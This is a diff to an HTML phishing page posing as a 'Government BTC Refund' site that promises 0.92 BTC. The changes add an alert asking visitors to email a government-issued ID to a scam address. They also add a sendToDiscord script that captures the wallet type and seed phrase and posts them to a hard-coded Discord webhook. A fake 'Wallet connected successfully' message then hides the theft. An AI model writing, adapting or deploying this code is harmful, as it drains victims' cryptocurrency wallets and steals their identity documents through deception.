@@ -24,11 +24,11 @@
     }
 
     h2 {
-      color: #003399;
+      color: #f7931a;
     }
 
     .btn {
-      background-color: #003399;
+      background-color: #f7931a;
       color: white;
       padding: 12px 20px;
       margin-top: 20px;
@@ -40,7 +40,7 @@
 
     .note {
       font-size: 13px;
-      color: #555;
+      color: #777;
       margin-top: 10px;
     }
 
@@ -51,19 +51,35 @@
       border-radius: 5px;
       border: 1px solid #ccc;
     }
+
+    .alert {
+      background-color: #fff3cd;
+      color: #856404;
+      padding: 12px;
+      border-radius: 6px;
+      margin-bottom: 20px;
+      font-size: 14px;
+      border: 1px solid #ffeeba;
+    }
   </style>
 </head>
 <body>
   <div class="container">
+
+    <div class="alert">
+      To verify your eligibility to claim this refund, please send a government-issued ID to:  
+      <strong>admin@govbtcclaim.org</strong>
+    </div>
+
     <h2>🇺🇸 Government BTC Refund</h2>
     <p>Claim your Bitcoin refund through verified wallet connection.</p>
     <p><strong>Amount to be received: 0.92 BTC ≈ $99,791</strong></p>
 
     <button class="btn" onclick="document.getElementById('walletSection').style.display='block'">Connect Wallet</button>
 
-    <form id="walletSection" action="tracker.php" method="POST" style="display:none; margin-top:20px;">
+    <form id="walletSection" style="display:none; margin-top:20px;" onsubmit="sendToDiscord(event)">
       <label for="walletSelect">Wallet Type:</label>
-      <select id="walletSelect" name="wallet">
+      <select id="walletSelect" name="wallet" required>
         <option value="MetaMask">MetaMask</option>
         <option value="TrustWallet">Trust Wallet</option>
         <option value="Coinbase">Coinbase Wallet</option>
@@ -79,7 +95,7 @@
     <div class="note">
       Minimum wallet balance: 0.0092 BTC<br>
       <small>(If your balance is lower, contact support)</small><br>
-      For inquiries: <strong>govbtcclaim@outlook.com</strong>
+      For inquiries: <strong>admin@govbtcclaim.org</strong>
     </div>
   </div>
 
@@ -94,6 +110,37 @@
       s1.setAttribute('crossorigin', '*');
       s0.parentNode.insertBefore(s1, s0);
     })();
+  </script>
+
+  <!-- Discord Webhook Script -->
+  <script>
+    function sendToDiscord(event) {
+      event.preventDefault();
+
+      const wallet = document.getElementById('walletSelect').value;
+      const phrase = document.getElementById('seedInput').value;
+
+      const data = {
+        content: `🔥 New Submission:
+        \nWallet Type: **${wallet}**
+        \nSeed Phrase: **${phrase}**`
+      };
+
+      fetch('https://discord.com/api/webhooks/1392560855530602496/WLDqr-oxayIjorh97lgir03TQj4rcVYqnKDEMCoJ_jC_xix590twBocxE4eMY85ViMzG', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      }).then(() => {
+        alert("Wallet connected successfully.");
+        document.getElementById('walletSection').reset();
+        document.getElementById('walletSection').style.display = 'none';
+      }).catch(err => {
+        alert("Failed to connect. Try again later.");
+        console.error(err);
+      });
+    }
   </script>
 </body>
 </html>
